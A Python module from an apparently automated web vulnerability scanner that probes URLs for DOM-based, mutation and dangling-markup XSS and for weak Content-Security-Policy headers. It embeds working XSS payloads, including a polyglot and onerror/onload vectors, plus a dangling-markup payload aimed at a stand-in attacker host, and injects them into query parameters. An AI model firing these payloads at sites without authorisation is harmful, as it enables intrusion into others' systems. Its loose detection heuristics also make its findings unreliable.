"""Advanced XSS: DOM-based, mutation, polyglot, CSP bypass, dangling markup."""
from core.http import get
from core.findings import Finding
from core.memory import log_event
import urllib.parse

DOM_SINKS = ["document.write", "innerHTML", "outerHTML", "insertAdjacentHTML", "eval(", "setTimeout(", "setInterval(", "new Function(", "location.href", "location.assign", "location.replace", "document.location"]

POLYGLOTS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "'\"><img src=x onerror=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "javascript:alert(1)//",
    "'-alert(1)-'",
    "\"-alert(1)-\"",
]

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    r = get(url)
    if r.status == 0:
        return findings
    body = r.text or ""
    # DOM XSS: check if URL params flow into sinks in JS
    for sink in DOM_SINKS:
        if sink in body:
            # check if any query param name appears near sink
            qs = urllib.parse.parse_qs(parsed.query)
            for param in qs:
                if param in body and sink in body:
                    findings.append(Finding(
                        id=f"domxss-{sink[:8]}-{hash(url) & 0xffff:x}",
                        target=parsed.netloc,
                        type="DOM-based XSS (potential)",
                        severity="medium",
                        url=url,
                        parameter=param,
                        payload=f"{param} -> {sink}",
                        evidence=f"Param '{param}' and sink '{sink}' in same page",
                        response_snippet=body[:300],
                        confidence=0.4,
                    ))
                    break
    # dangling markup
    if "<" in body and "href=" in body.lower():
        findings.append(Finding(
            id=f"dangling-{hash(url) & 0xffff:x}",
            target=parsed.netloc,
            type="Dangling Markup Injection (potential)",
            severity="low",
            url=url,
            parameter="html",
            payload="\"><img src='//evil.example.com/",
            evidence="Unquoted attribute context possible",
            response_snippet=body[:200],
            confidence=0.3,
        ))
    # CSP bypass check
    csp = r.headers.get("content-security-policy", "")
    if csp and ("unsafe-inline" in csp or "unsafe-eval" in csp or "*" in csp):
        findings.append(Finding(
            id=f"csp-bypass-{hash(url) & 0xffff:x}",
            target=parsed.netloc,
            type="CSP Bypass (unsafe-inline/eval/*)",
            severity="medium",
            url=url,
            parameter="header",
            payload=csp[:120],
            evidence=f"CSP allows unsafe-inline/eval/wildcard: {csp[:120]}",
            response_snippet=csp[:200],
            confidence=0.8,
        ))
    # mutation XSS: test polyglot reflection
    qs = urllib.parse.parse_qs(parsed.query)
    test_params = list(qs.keys()) if qs else []
    for param in test_params:
        for poly in POLYGLOTS[:3]:
            q = dict(qs)
            q[param] = [poly]
            new_url = parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl()
            r2 = get(new_url)
            if r2.status == 0:
                continue
            if poly in r2.text or "<svg" in r2.text or "onload" in r2.text:
                findings.append(Finding(
                    id=f"mxss-{hash(new_url) & 0xffff:x}",
                    target=parsed.netloc,
                    type="Mutation XSS (mXSS)",
                    severity="high",
                    url=new_url,
                    parameter=param,
                    payload=poly[:60],
                    evidence="Polyglot reflected; mutation possible",
                    response_snippet=r2.snippet(200),
                    confidence=0.5,
                ))
                break
    log_event(parsed.netloc, "xss_advanced_scan", {"url": url, "findings": len(findings)})
    return findings
